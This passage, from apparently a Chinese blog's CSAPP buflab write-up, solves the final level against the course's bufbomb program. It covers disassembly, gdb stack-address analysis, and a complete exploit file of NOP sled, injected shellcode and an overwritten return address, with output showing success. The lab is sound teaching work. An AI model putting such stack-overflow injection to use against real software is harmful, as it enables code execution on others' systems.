class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">4</span>,(%esp)<br> <span class="hljs-attribute">8048e7d</span>:	e<span class="hljs-number">8</span> f<span class="hljs-number">9</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048e82</span>:	eb <span class="hljs-number">18</span>                	jmp    <span class="hljs-number">8048</span>e<span class="hljs-number">9</span>c &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">76</span>&gt;<br> <span class="hljs-attribute">8048e84</span>:	<span class="hljs-number">89</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          	mov    %ebx,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048e88</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">62</span> a<span class="hljs-number">5</span> <span class="hljs-number">04</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">562</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048e8f</span>:	<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048e90</span>:	c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 	movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048e97</span>:	e<span class="hljs-number">8</span> <span class="hljs-number">24</span> fb ff ff       	call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048e9c</span>:	<span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">24</span>             	add    $<span class="hljs-number">0</span>x<span class="hljs-number">24</span>,%esp<br> <span class="hljs-attribute">8048e9f</span>:	<span class="hljs-number">5</span>b                   	pop    %ebx<br> <span class="hljs-attribute">8048ea0</span>:	<span class="hljs-number">5</span>d                   	pop    %ebp<br> <span class="hljs-attribute">8048ea1</span>:	c<span class="hljs-number">3</span>                   	ret    <br><br><span class="hljs-attribute">0804920c</span> &lt;getbufn&gt;:<br> <span class="hljs-attribute">804920c</span>:	<span class="hljs-number">55</span>                   	push   %ebp<br> <span class="hljs-attribute">804920d</span>:	<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                	mov    %esp,%ebp<br> <span class="hljs-attribute">804920f</span>:	<span class="hljs-number">81</span> ec <span class="hljs-number">18</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    	sub    $<span class="hljs-number">0</span>x<span class="hljs-number">218</span>,%esp<br> <span class="hljs-attribute">8049215</span>:	<span class="hljs-number">8</span>d <span class="hljs-number">85</span> f<span class="hljs-number">8</span> fd ff ff    	lea    -<span class="hljs-number">0</span>x<span class="hljs-number">208</span>(%ebp),%eax<br> <span class="hljs-attribute">804921b</span>:	<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             	mov    %eax,(%esp)<br> <span class="hljs-attribute">804921e</span>:	e<span class="hljs-number">8</span> d<span class="hljs-number">7</span> fa ff ff       	call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br> <span class="hljs-attribute">8049223</span>:	b<span class="hljs-number">8</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       	mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br> <span class="hljs-attribute">8049228</span>:	c<span class="hljs-number">9</span>                   	leave  <br> <span class="hljs-attribute">8049229</span>:	c<span class="hljs-number">3</span>                   	ret    <br> <span class="hljs-attribute">804922a</span>:	<span class="hljs-number">90</span>                   	nop<br> <span class="hljs-attribute">804922b</span>:	<span class="hljs-number">90</span>                   	nop<br></code></pre></td></tr></table></figure>
+<p>断点调试：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">b</span> testn<br><br><span class="hljs-keyword">b</span> getbufn<br><br><span class="hljs-symbol">run</span> -n -u nmsl &lt; exploit.txt<br></code></pre></td></tr></table></figure>
+
+<p>在五次调用getbuf的过程中，ebp的值统计如下：</p>
+<p>testn<br>ebp:0x55683880、0x556838e0、0x55683800、0x55683880、0x55683840</p>
+<p>getbuf<br>ebp:0x55683850、0x556838b0、0x556837d0、0x55683850、0x55683810</p>
+<p>getbufn开辟的缓冲区大小是520，也即是说，buf[0]的地址是ebp-520，因此buf[0]的地址有这些可能：55683648、556836A8、556835C8、55683648、55683608，<strong>为了保证注入代码都可以执行，选择地址最大的556836A8作为覆盖的返回地址</strong></p>
+<p>注入代码：</p>
+<ul>
+<li>将eax赋值为$0x6185560e</li>
+<li>恢复ebp，也即是将esp+0x28赋给ebp</li>
+<li>push返回地址，ret</li>
+<li>覆盖返回地址</li>
+</ul>
+<p>exploit.txt:</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">515 +<span class="hljs-number"> 15 </span>+<span class="hljs-number"> 4 </span>+ 4<br><br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br><br>// ...... 一共是515个0x90<br><br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>b8 0e<span class="hljs-number"> 56 </span>85<span class="hljs-number"> 61 </span>//注入的二进制代码<br>8d 6c<span class="hljs-number"> 24 </span>28 <br>68 3a 8e<span class="hljs-number"> 04 </span>08 <br>c3<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>  //ebp<br>A8<span class="hljs-number"> 36 </span>68<span class="hljs-number"> 55 </span>  //返回地址，跳转到buf[0]<br></code></pre></td></tr></table></figure>
+
+<p>测试：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw -n | ./bufbomb -n -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure>
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CSAPP/" class="category-chain-item">CSAPP</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CSAPP-lab3：buflab</div>
+      <div>http://gls.show/p/db3828d1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月31日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/f9220a0b/" title="Windows all in one：从零开始的Windows快速配置">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Windows all in one：从零开始的Windows快速配置</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/f57f952b/" title="pwnable.kr 刷题记录">
+                        <span class="hidden-mobile">pwnable.kr 刷题记录</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
